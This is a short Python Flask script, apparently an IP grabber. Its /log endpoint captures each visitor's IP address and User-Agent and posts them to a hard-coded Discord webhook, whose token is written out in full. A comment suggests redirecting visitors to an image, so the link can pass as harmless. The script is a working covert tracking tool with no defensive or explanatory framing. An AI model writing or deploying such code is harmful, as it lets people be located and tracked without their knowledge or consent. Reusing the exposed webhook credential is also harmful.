from flask import Flask, request
import requests
import os

app = Flask(__name__)
WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"

@app.route('/log')
def log_ip():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    data = {
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    }
    requests.post(WEBHOOK_URL, json=data)
    return "OK"  # oder redirect zu Bild

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
    app.run()